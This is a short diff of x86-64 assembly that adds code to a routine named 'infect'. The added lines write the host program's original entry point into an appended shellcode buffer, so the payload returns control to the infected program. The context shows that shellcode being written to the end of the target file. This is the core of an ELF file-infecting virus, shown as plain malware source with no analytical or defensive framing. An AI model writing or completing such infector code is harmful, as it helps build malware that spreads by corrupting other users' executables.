@@ -235,6 +235,11 @@ infect:
     xor r10, r10    ; No offset
     syscall
 
+    ; Update shellcode to jump to the original entry point
+    mov rsi, shellcode   
+    mov eax, [old_e_entry]      
+    mov [rsi + shellcode_len - 6], eax         ; 4 for the placeholders and 2 for jmp rax
+
     ; Write the shellcode at the end of the file
     mov rax, 18      ; pwrite64
     mov rdi, [fd]
